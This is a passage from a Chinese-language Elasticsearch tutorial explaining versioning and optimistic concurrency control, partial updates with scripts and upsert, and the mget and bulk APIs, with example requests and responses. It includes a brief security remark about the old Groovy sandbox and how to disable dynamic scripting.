<p>响应体告诉我们，这个新创建的文档 _version 版本号是 1 。现在假设我们想编辑这个文档：我们加载其数据到 web 表单中，做一些修改，然后保存新的版本。</p>
<p>首先我们检索文档:<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /website/blog/1</span><br></pre></td></tr></table></figure></p>
<p>响应体包含相同的 _version 版本号 1 ：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"_index"</span> :   <span class="string">"website"</span>,</span><br><span class="line">  <span class="attr">"_type"</span> :    <span class="string">"blog"</span>,</span><br><span class="line">  <span class="attr">"_id"</span> :      <span class="string">"1"</span>,</span><br><span class="line">  <span class="attr">"_version"</span> : <span class="number">1</span>,</span><br><span class="line">  <span class="attr">"found"</span> :    <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"_source"</span> :  &#123;</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">"My first blog entry"</span>,</span><br><span class="line">      <span class="attr">"text"</span>:  <span class="string">"Just trying this out..."</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>现在，当我们尝试通过重建文档的索引来保存修改，我们指定 version 为我们的修改会被应用的版本：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PUT /website/blog/1?version=1 </span><br><span class="line">&#123;</span><br><span class="line">  "title": "My first blog entry",</span><br><span class="line">  "text":  "Starting to get the hang of this..."</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个在我们索引中的文档只有现在的 _version 为 1 时，本次更新才能成功。</p>
<p>此请求成功，并且响应体告诉我们 _version 已经递增到 2 ：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"_index"</span>:   <span class="string">"website"</span>,</span><br><span class="line">  <span class="attr">"_type"</span>:    <span class="string">"blog"</span>,</span><br><span class="line">  <span class="attr">"_id"</span>:      <span class="string">"1"</span>,</span><br><span class="line">  <span class="attr">"_version"</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">"created"</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然而，如果我们重新运行相同的索引请求，仍然指定 version=1 ， Elasticsearch 返回 409 Conflict HTTP 响应码，和一个如下所示的响应体：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"error"</span>: &#123;</span><br><span class="line">      <span class="attr">"root_cause"</span>: [</span><br><span class="line">         &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"version_conflict_engine_exception"</span>,</span><br><span class="line">            <span class="attr">"reason"</span>: <span class="string">"[blog][1]: version conflict, current [2], provided [1]"</span>,</span><br><span class="line">            <span class="attr">"index"</span>: <span class="string">"website"</span>,</span><br><span class="line">            <span class="attr">"shard"</span>: <span class="string">"3"</span></span><br><span class="line">         &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"type"</span>: <span class="string">"version_conflict_engine_exception"</span>,</span><br><span class="line">      <span class="attr">"reason"</span>: <span class="string">"[blog][1]: version conflict, current [2], provided [1]"</span>,</span><br><span class="line">      <span class="attr">"index"</span>: <span class="string">"website"</span>,</span><br><span class="line">      <span class="attr">"shard"</span>: <span class="string">"3"</span></span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="attr">"status"</span>: <span class="number">409</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这告诉我们在 Elasticsearch 中这个文档的当前 _version 号是 2 ，但我们指定的更新版本号为 1 。</p>
<p>我们现在怎么做取决于我们的应用需求。我们可以告诉用户说其他人已经修改了文档，并且在再次保存之前检查这些修改内容。 或者，在之前的商品 stock_count 场景，我们可以获取到最新的文档并尝试重新应用这些修改。</p>
<p>所有文档的更新或删除 API，都可以接受 version 参数，这允许你在代码中使用乐观的并发控制。</p>
<p>通过外部系统使用版本控制编辑</p>
<p>一个常见的设置是使用其它数据库作为主要的数据存储，使用 Elasticsearch 做数据检索， 这意味着主数据库的所有更改发生时都需要被复制到 Elasticsearch ，如果多个进程负责这一数据同步，你可能遇到类似于之前描述的并发问题。</p>
<p>如果你的主数据库已经有了版本号 — 或一个能作为版本号的字段值比如 timestamp — 那么你就可以在 Elasticsearch 中通过增加 version_type=external 到查询字符串的方式重用这些相同的版本号， 版本号必须是大于零的整数， 且小于 9.2E+18 — 一个 Java 中 long 类型的正值。</p>
<p>外部版本号的处理方式和我们之前讨论的内部版本号的处理方式有些不同， Elasticsearch 不是检查当前 _version 和请求中指定的版本号是否相同， 而是检查当前 _version 是否 小于 指定的版本号。 如果请求成功，外部的版本号作为文档的新 _version 进行存储。</p>
<p>外部版本号不仅在索引和删除请求是可以指定，而且在 创建 新文档时也可以指定。</p>
<p>例如，要创建一个新的具有外部版本号 5 的博客文章，我们可以按以下方法进行：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PUT /website/blog/2?version=5&amp;version_type=external</span><br><span class="line">&#123;</span><br><span class="line">  "title": "My first external blog entry",</span><br><span class="line">  "text":  "Starting to get the hang of this..."</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在响应中，我们能看到当前的 _version 版本号是 5 ：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"_index"</span>:   <span class="string">"website"</span>,</span><br><span class="line">  <span class="attr">"_type"</span>:    <span class="string">"blog"</span>,</span><br><span class="line">  <span class="attr">"_id"</span>:      <span class="string">"2"</span>,</span><br><span class="line">  <span class="attr">"_version"</span>: <span class="number">5</span>,</span><br><span class="line">  <span class="attr">"created"</span>:  <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>现在我们更新这个文档，指定一个新的 version 号是 10 ：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PUT /website/blog/2?version=10&amp;version_type=external</span><br><span class="line">&#123;</span><br><span class="line">  "title": "My first external blog entry",</span><br><span class="line">  "text":  "This is a piece of cake..."</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"_index"</span>:   <span class="string">"website"</span>,</span><br><span class="line">  <span class="attr">"_type"</span>:    <span class="string">"blog"</span>,</span><br><span class="line">  <span class="attr">"_id"</span>:      <span class="string">"2"</span>,</span><br><span class="line">  <span class="attr">"_version"</span>: <span class="number">10</span>,</span><br><span class="line">  <span class="attr">"created"</span>:  <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果你要重新运行此请求时，它将会失败，并返回像我们之前看到的同样的冲突错误， 因为指定的外部版本号不大于 Elasticsearch 的当前版本号。</p>
<h2 id="文档的部分更新"><a href="#文档的部分更新" class="headerlink" title="文档的部分更新"></a>文档的部分更新</h2><p>在 更新整个文档 , 我们已经介绍过 更新一个文档的方法是检索并修改它，然后重新索引整个文档，这的确如此。然而，使用 update API 我们还可以部分更新文档，例如在某个请求时对计数器进行累加。</p>
<p>我们也介绍过文档是不可变的：他们不能被修改，只能被替换。 update API 必须遵循同样的规则。 从外部来看，我们在一个文档的某个位置进行部分更新。然而在内部， update API 简单使用与之前描述相同的 检索-修改-重建索引 的处理过程。 区别在于这个过程发生在分片内部，这样就避免了多次请求的网络开销。通过减少检索和重建索引步骤之间的时间，我们也减少了其他进程的变更带来冲突的可能性。</p>
<p>update 请求最简单的一种形式是接收文档的一部分作为 doc 的参数， 它只是与现有的文档进行合并。对象被合并到一起，覆盖现有的字段，增加新的字段。 例如，我们增加字段 tags 和 views 到我们的博客文章，如下所示：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /website/blog/1/_update</span><br><span class="line">&#123;</span><br><span class="line">   "doc" : &#123;</span><br><span class="line">      "tags" : [ "testing" ],</span><br><span class="line">      "views": 0</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"_index"</span> :   <span class="string">"website"</span>,</span><br><span class="line">   <span class="attr">"_id"</span> :      <span class="string">"1"</span>,</span><br><span class="line">   <span class="attr">"_type"</span> :    <span class="string">"blog"</span>,</span><br><span class="line">   <span class="attr">"_version"</span> : <span class="number">3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>检索文档显示了更新后的 _source 字段：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"_index"</span>:    <span class="string">"website"</span>,</span><br><span class="line">   <span class="attr">"_type"</span>:     <span class="string">"blog"</span>,</span><br><span class="line">   <span class="attr">"_id"</span>:       <span class="string">"1"</span>,</span><br><span class="line">   <span class="attr">"_version"</span>:  <span class="number">3</span>,</span><br><span class="line">   <span class="attr">"found"</span>:     <span class="literal">true</span>,</span><br><span class="line">   <span class="attr">"_source"</span>: &#123;</span><br><span class="line">      <span class="attr">"title"</span>:  <span class="string">"My first blog entry"</span>,</span><br><span class="line">      <span class="attr">"text"</span>:   <span class="string">"Starting to get the hang of this..."</span>,</span><br><span class="line">      <span class="attr">"tags"</span>: [ <span class="string">"testing"</span> ], </span><br><span class="line">      <span class="attr">"views"</span>:  <span class="number">0</span> </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>使用脚本部分更新文档编辑</p>
<p>脚本可以在 update API中用来改变 _source 的字段内容， 它在更新脚本中称为 ctx._source 。 例如，我们可以使用脚本来增加博客文章中 views 的数量：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /website/blog/1/_update</span><br><span class="line">&#123;</span><br><span class="line">   "script" : "ctx._source.views+=1"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>用 Groovy 脚本编程</p>
<p>对于那些 API 不能满足需求的情况，Elasticsearch 允许你使用脚本编写自定义的逻辑。 许多API都支持脚本的使用，包括搜索、排序、聚合和文档更新。 脚本可以作为请求的一部分被传递，从特殊的 .scripts 索引中检索，或者从磁盘加载脚本。</p>
<p>默认的脚本语言 是 Groovy，一种快速表达的脚本语言，在语法上与 JavaScript 类似。 它在 Elasticsearch V1.3.0 版本首次引入并运行在 沙盒 中，然而 Groovy 脚本引擎存在漏洞， 允许攻击者通过构建 Groovy 脚本，在 Elasticsearch Java VM 运行时脱离沙盒并执行 shell 命令。</p>
<p>因此，在版本 v1.3.8 、 1.4.3 和 V1.5.0 及更高的版本中，它已经被默认禁用。 此外，您可以通过设置集群中的所有节点的 config/elasticsearch.yml 文件来禁用动态 Groovy 脚本：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">script.groovy.sandbox.enabled: false</span><br></pre></td></tr></table></figure></p>
<p>这将关闭 Groovy 沙盒，从而防止动态 Groovy 脚本作为请求的一部分被接受， 或者从特殊的 .scripts 索引中被检索。当然，你仍然可以使用存储在每个节点的 config/scripts/ 目录下的 Groovy 脚本。</p>
<p>我们也可以通过使用脚本给 tags 数组添加一个新的标签。在这个例子中，我们指定新的标签作为参数，而不是硬编码到脚本内部。 这使得 Elasticsearch 可以重用这个脚本，而不是每次我们想添加标签时都要对新脚本重新编译：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /website/blog/1/_update</span><br><span class="line">&#123;</span><br><span class="line">   "script" : "ctx._source.tags+=new_tag",</span><br><span class="line">   "params" : &#123;</span><br><span class="line">      "new_tag" : "search"</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>获取文档并显示最后两次请求的效果：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"_index"</span>:    <span class="string">"website"</span>,</span><br><span class="line">   <span class="attr">"_type"</span>:     <span class="string">"blog"</span>,</span><br><span class="line">   <span class="attr">"_id"</span>:       <span class="string">"1"</span>,</span><br><span class="line">   <span class="attr">"_version"</span>:  <span class="number">5</span>,</span><br><span class="line">   <span class="attr">"found"</span>:     <span class="literal">true</span>,</span><br><span class="line">   <span class="attr">"_source"</span>: &#123;</span><br><span class="line">      <span class="attr">"title"</span>:  <span class="string">"My first blog entry"</span>,</span><br><span class="line">      <span class="attr">"text"</span>:   <span class="string">"Starting to get the hang of this..."</span>,</span><br><span class="line">      <span class="attr">"tags"</span>:  [<span class="string">"testing"</span>, <span class="string">"search"</span>], </span><br><span class="line">      <span class="attr">"views"</span>:  <span class="number">1</span> </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们甚至可以选择通过设置 ctx.op 为 delete 来删除基于其内容的文档：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /website/blog/1/_update</span><br><span class="line">&#123;</span><br><span class="line">   "script" : "ctx.op = ctx._source.views == count ? 'delete' : 'none'",</span><br><span class="line">    "params" : &#123;</span><br><span class="line">        "count": 1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>更新的文档可能尚不存在</p>
<p>假设我们需要 在 Elasticsearch 中存储一个页面访问量计数器。 每当有用户浏览网页，我们对该页面的计数器进行累加。但是，如果它是一个新网页，我们不能确定计数器已经存在。 如果我们尝试更新一个不存在的文档，那么更新操作将会失败。</p>
<p>在这样的情况下，我们可以使用 upsert 参数，指定如果文档不存在就应该先创建它：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /website/pageviews/1/_update</span><br><span class="line">&#123;</span><br><span class="line">   "script" : "ctx._source.views+=1",</span><br><span class="line">   "upsert": &#123;</span><br><span class="line">       "views": 1</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们第一次运行这个请求时， upsert 值作为新文档被索引，初始化 views 字段为 1 。 在后续的运行中，由于文档已经存在， script 更新操作将替代 upsert 进行应用，对 views 计数器进行累加。</p>
<p>更新和冲突</p>
<p>在本节的介绍中，我们说明 检索 和 重建索引 步骤的间隔越小，变更冲突的机会越小。 但是它并不能完全消除冲突的可能性。 还是有可能在 update 设法重新索引之前，来自另一进程的请求修改了文档。</p>
<p>为了避免数据丢失， update API 在 检索 步骤时检索得到文档当前的 _version 号，并传递版本号到 重建索引 步骤的 index 请求。 如果另一个进程修改了处于检索和重新索引步骤之间的文档，那么 _version 号将不匹配，更新请求将会失败。</p>
<p>对于部分更新的很多使用场景，文档已经被改变也没有关系。 例如，如果两个进程都对页面访问量计数器进行递增操作，它们发生的先后顺序其实不太重要； 如果冲突发生了，我们唯一需要做的就是尝试再次更新。</p>
<p>这可以通过 设置参数 retry_on_conflict 来自动完成， 这个参数规定了失败之前 update 应该重试的次数，它的默认值为 0 。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /website/pageviews/1/_update?retry_on_conflict=5 </span><br><span class="line">&#123;</span><br><span class="line">   "script" : "ctx._source.views+=1",</span><br><span class="line">   "upsert": &#123;</span><br><span class="line">       "views": 0</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>失败之前重试该更新5次。</p>
<p>在增量操作无关顺序的场景，例如递增计数器等这个方法十分有效，但是在其他情况下变更的顺序 是 非常重要的。 类似 index API ， update API 默认采用 最终写入生效 的方案，但它也接受一个 version 参数来允许你使用 optimistic concurrency control 指定想要更新文档的版本。</p>
<p>取回多个文档</p>
<p>Elasticsearch 的速度已经很快了，但甚至能更快。 将多个请求合并成一个，避免单独处理每个请求花费的网络延时和开销。 如果你需要从 Elasticsearch 检索很多文档，那么使用 multi-get 或者 mget API 来将这些检索请求放在一个请求中，将比逐个文档请求更快地检索到全部文档。</p>
<p>mget API 要求有一个 docs 数组作为参数，每个 元素包含需要检索文档的元数据， 包括 _index 、 _type 和 _id 。如果你想检索一个或者多个特定的字段，那么你可以通过 _source 参数来指定这些字段的名字：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /_mget</span><br><span class="line">&#123;</span><br><span class="line">   "docs" : [</span><br><span class="line">      &#123;</span><br><span class="line">         "_index" : "website",</span><br><span class="line">         "_type" :  "blog",</span><br><span class="line">         "_id" :    2</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         "_index" : "website",</span><br><span class="line">         "_type" :  "pageviews",</span><br><span class="line">         "_id" :    1,</span><br><span class="line">         "_source": "views"</span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>该响应体也包含一个 docs 数组 ， 对于每一个在请求中指定的文档，这个数组中都包含有一个对应的响应，且顺序与请求中的顺序相同。 其中的每一个响应都和使用单个 get request 请求所得到的响应体相同：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"docs"</span> : [</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="attr">"_index"</span> :   <span class="string">"website"</span>,</span><br><span class="line">         <span class="attr">"_id"</span> :      <span class="string">"2"</span>,</span><br><span class="line">         <span class="attr">"_type"</span> :    <span class="string">"blog"</span>,</span><br><span class="line">         <span class="attr">"found"</span> :    <span class="literal">true</span>,</span><br><span class="line">         <span class="attr">"_source"</span> : &#123;</span><br><span class="line">            <span class="attr">"text"</span> :  <span class="string">"This is a piece of cake..."</span>,</span><br><span class="line">            <span class="attr">"title"</span> : <span class="string">"My first external blog entry"</span></span><br><span class="line">         &#125;,</span><br><span class="line">         <span class="attr">"_version"</span> : <span class="number">10</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="attr">"_index"</span> :   <span class="string">"website"</span>,</span><br><span class="line">         <span class="attr">"_id"</span> :      <span class="string">"1"</span>,</span><br><span class="line">         <span class="attr">"_type"</span> :    <span class="string">"pageviews"</span>,</span><br><span class="line">         <span class="attr">"found"</span> :    <span class="literal">true</span>,</span><br><span class="line">         <span class="attr">"_version"</span> : <span class="number">2</span>,</span><br><span class="line">         <span class="attr">"_source"</span> : &#123;</span><br><span class="line">            <span class="attr">"views"</span> : <span class="number">2</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果想检索的数据都在相同的 _index 中（甚至相同的 _type 中），则可以在 URL 中指定默认的 /_index 或者默认的 /_index/_type 。<br>你仍然可以通过单独请求覆盖这些值：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /website/blog/_mget</span><br><span class="line">&#123;</span><br><span class="line">   "docs" : [</span><br><span class="line">      &#123; "_id" : 2 &#125;,</span><br><span class="line">      &#123; "_type" : "pageviews", "_id" :   1 &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>事实上，如果所有文档的 _index 和 _type 都是相同的，你可以只传一个 ids 数组，而不是整个 docs 数组：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /website/blog/_mget</span><br><span class="line">&#123;</span><br><span class="line">   "ids" : [ "2", "1" ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注意，我们请求的第二个文档是不存在的。我们指定类型为 blog ，但是文档 ID 1 的类型是 pageviews ，这个不存在的情况将在响应体中被报告：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"docs"</span> : [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"_index"</span> :   <span class="string">"website"</span>,</span><br><span class="line">      <span class="attr">"_type"</span> :    <span class="string">"blog"</span>,</span><br><span class="line">      <span class="attr">"_id"</span> :      <span class="string">"2"</span>,</span><br><span class="line">      <span class="attr">"_version"</span> : <span class="number">10</span>,</span><br><span class="line">      <span class="attr">"found"</span> :    <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">"_source"</span> : &#123;</span><br><span class="line">        <span class="attr">"title"</span>:   <span class="string">"My first external blog entry"</span>,</span><br><span class="line">        <span class="attr">"text"</span>:    <span class="string">"This is a piece of cake..."</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"_index"</span> :   <span class="string">"website"</span>,</span><br><span class="line">      <span class="attr">"_type"</span> :    <span class="string">"blog"</span>,</span><br><span class="line">      <span class="attr">"_id"</span> :      <span class="string">"1"</span>,</span><br><span class="line">      <span class="attr">"found"</span> :    <span class="literal">false</span>  </span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>事实上第二个文档未能找到并不妨碍第一个文档被检索到。每个文档都是单独检索和报告的。</p>
<p>即使有某个文档没有找到，上述请求的 HTTP 状态码仍然是 200 。事实上，即使请求 没有 找到任何文档，它的状态码依然是 200 –因为 mget 请求本身已经成功执行。 为了确定某个文档查找是成功或者失败，你需要检查 found 标记。</p>
<h2 id="代价较小的批量操作"><a href="#代价较小的批量操作" class="headerlink" title="代价较小的批量操作"></a>代价较小的批量操作</h2><p>与 mget 可以使我们一次取回多个文档同样的方式， bulk API 允许在单个步骤中进行多次 create 、 index 、 update 或 delete 请求。 如果你需要索引一个数据流比如日志事件，它可以排队和索引数百或数千批次。</p>
<p>bulk 与其他的请求体格式稍有不同，如下所示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123; action: &#123; metadata &#125;&#125;\n</span><br><span class="line">&#123; request body        &#125;\n</span><br><span class="line">&#123; action: &#123; metadata &#125;&#125;\n</span><br><span class="line">&#123; request body        &#125;\n</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这种格式类似一个有效的单行 JSON 文档 流 ，它通过换行符(\n)连接到一起。注意两个要点：</p>
<p>1.每行一定要以换行符(\n)结尾， 包括最后一行 。这些换行符被用作一个标记，可以有效分隔行。<br>2.这些行不能包含未转义的换行符，因为他们将会对解析造成干扰。这意味着这个 JSON 不 能使用 pretty 参数打印。<br>action/metadata 行指定 哪一个文档 做 什么操作 。<br>action 必须是以下选项之一:<br>   create 如果文档不存在，那么就创建它。详情请见 创建新文档。<br>   index 创建一个新文档或者替换一个现有的文档。详情请见 索引文档 和 更新整个文档。<br>   update 部分更新一个文档。详情请见 文档的部分更新。<br>   delete 删除一个文档。详情请见 删除文档。<br>   metadata 应该 指定被索引、创建、更新或者删除的文档的 _index 、 _type 和 _id 。</p>
<p>例如，一个 delete 请求看起来是这样的：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123; &quot;delete&quot;: &#123; &quot;_index&quot;: &quot;website&quot;, &quot;_type&quot;: &quot;blog&quot;, &quot;_id&quot;: &quot;123&quot; &#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>request body 行由文档的 _source 本身组成–文档包含的字段和值。它是 index 和 create 操作所必需的，这是有道理的：你必须提供文档以索引。</p>
<p>它也是 update 操作所必需的，并且应该包含你传递给 update API 的相同请求体： doc 、 upsert 、 script 等等。 删除操作不需要 request body 行。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123; "create":  &#123; "_index": "website", "_type": "blog", "_id": "123" &#125;&#125;</span><br><span class="line">&#123; "title":    "My first blog post" &#125;</span><br></pre></td></tr></table></figure></p>
<p>如果不指定 _id ，将会自动生成一个 ID ：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123; "index": &#123; "_index": "website", "_type": "blog" &#125;&#125;</span><br><span class="line">&#123; "title":    "My second blog post" &#125;</span><br></pre></td></tr></table></figure></p>
<p>为了把所有的操作组合在一起，一个完整的 bulk 请求 有以下形式:<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /_bulk</span><br><span class="line">&#123; "delete": &#123; "_index": "website", "_type": "blog", "_id": "123" &#125;&#125; </span><br><span class="line">&#123; "create": &#123; "_index": "website", "_type": "blog", "_id": "123" &#125;&#125;</span><br><span class="line">&#123; "title":    "My first blog post" &#125;</span><br><span class="line">&#123; "index":  &#123; "_index": "website", "_type": "blog" &#125;&#125;</span><br><span class="line">&#123; "title":    "My second blog post" &#125;</span><br><span class="line">&#123; "update": &#123; "_index": "website", "_type": "blog", "_id": "123", "_retry_on_conflict" : 3&#125; &#125;</span><br><span class="line">&#123; "doc" : &#123;"title" : "My updated blog post"&#125; &#125;</span><br></pre></td></tr></table></figure></p>
<p>这个 Elasticsearch 响应包含 items 数组， 这个数组的内容是以请求的顺序列出来的每个请求的结果。<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"took"</span>: <span class="number">4</span>,</span><br><span class="line">   <span class="attr">"errors"</span>: <span class="literal">false</span>, </span><br><span class="line">   <span class="attr">"items"</span>: [</span><br><span class="line">      &#123;  <span class="attr">"delete"</span>: &#123;</span><br><span class="line">            <span class="attr">"_index"</span>:   <span class="string">"website"</span>,</span><br><span class="line">            <span class="attr">"_type"</span>:    <span class="string">"blog"</span>,</span><br><span class="line">            <span class="attr">"_id"</span>:      <span class="string">"123"</span>,</span><br><span class="line">            <span class="attr">"_version"</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="attr">"status"</span>:   <span class="number">200</span>,</span><br><span class="line">            <span class="attr">"found"</span>:    <span class="literal">true</span></span><br><span class="line">      &#125;&#125;,</span><br><span class="line">      &#123;  <span class="attr">"create"</span>: &#123;</span><br><span class="line">            <span class="attr">"_index"</span>:   <span class="string">"website"</span>,</span><br><span class="line">            <span class="attr">"_type"</span>:    <span class="string">"blog"</span>,</span><br><span class="line">            <span class="attr">"_id"</span>:      <span class="string">"123"</span>,</span><br><span class="line">            <span class="attr">"_version"</span>: <span class="number">3</span>,</span><br><span class="line">            <span class="attr">"status"</span>:   <span class="number">201</span></span><br><span class="line">      &#125;&#125;,</span><br><span class="line">      &#123;  <span class="attr">"create"</span>: &#123;</span><br><span class="line">            <span class="attr">"_index"</span>:   <span class="string">"website"</span>,</span><br><span class="line">            <span class="attr">"_type"</span>:    <span class="string">"blog"</span>,</span><br><span class="line">            <span class="attr">"_id"</span>:      <span class="string">"EiwfApScQiiy7TIKFxRCTw"</span>,</span><br><span class="line">            <span class="attr">"_version"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"status"</span>:   <span class="number">201</span></span><br><span class="line">      &#125;&#125;,</span><br><span class="line">      &#123;  <span class="attr">"update"</span>: &#123;</span><br><span class="line">            <span class="attr">"_index"</span>:   <span class="string">"website"</span>,</span><br><span class="line">            <span class="attr">"_type"</span>:    <span class="string">"blog"</span>,</span><br><span class="line">            <span class="attr">"_id"</span>:      <span class="string">"123"</span>,</span><br><span class="line">            <span class="attr">"_version"</span>: <span class="number">4</span>,</span><br><span class="line">            <span class="attr">"status"</span>:   <span class="number">200</span></span><br><span class="line">      &#125;&#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>每个子请求都是独立执行，因此某个子请求的失败不会对其他子请求的成功与否造成影响。 如果其中任何子请求失败，最顶层的 error 标志被设置为 true ，并且在相应的请求报告出错误明细：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /_bulk</span><br><span class="line">&#123; "create": &#123; "_index": "website", "_type": "blog", "_id": "123" &#125;&#125;</span><br><span class="line">&#123; "title":    "Cannot create - it already exists" &#125;</span><br><span class="line">&#123; "index":  &#123; "_index": "website", "_type": "blog", "_id": "123" &#125;&#125;</span><br><span class="line">&#123; "title":    "But we can update it" &#125;</span><br></pre></td></tr></table></figure></p>
<p>在响应中，我们看到 create 文档 123 失败，因为它已经存在。但是随后的 index 请求，也是对文档 123 操作，就成功了：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"took"</span>: <span class="number">3</span>,</span><br><span class="line">   <span class="attr">"errors"</span>: <span class="literal">true</span>, </span><br><span class="line">   <span class="attr">"items"</span>: [</span><br><span class="line">      &#123;  <span class="attr">"create"</span>: &#123;</span><br><span class="line">            <span class="attr">"_index"</span>:   <span class="string">"website"</span>,</span><br><span class="line">            <span class="attr">"_type"</span>:    <span class="string">"blog"</span>,</span><br><span class="line">            <span class="attr">"_id"</span>:      <span class="string">"123"</span>,</span><br><span class="line">            <span class="attr">"status"</span>:   <span class="number">409</span>, </span><br><span class="line">            <span class="attr">"error"</span>:    <span class="string">"DocumentAlreadyExistsException </span></span><br><span class="line"><span class="string">                        [[website][4] [blog][123]:</span></span><br><span class="line"><span class="string">                        document already exists]"</span></span><br><span class="line">      &#125;&#125;,</span><br><span class="line">      &#123;  <span class="attr">"index"</span>: &#123;</span><br><span class="line">            <span class="attr">"_index"</span>:   <span class="string">"website"</span>,</span><br><span class="line">            <span class="attr">"_type"</span>:    <span class="string">"blog"</span>,</span><br><span class="line">            <span class="attr">"_id"</span>:      <span class="string">"123"</span>,</span><br><span class="line">            <span class="attr">"_version"</span>: <span class="number">5</span>,</span><br><span class="line">            <span class="attr">"status"</span>:   <span class="number">200</span> </span><br><span class="line">      &#125;&#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这也意味着 bulk 请求不是原子的： 不能用它来实现事务控制。每个请求是单独处理的，因此一个请求的成功或失败不会影响其他的请求。</p>
<p>不要重复指定Index和Type</p>
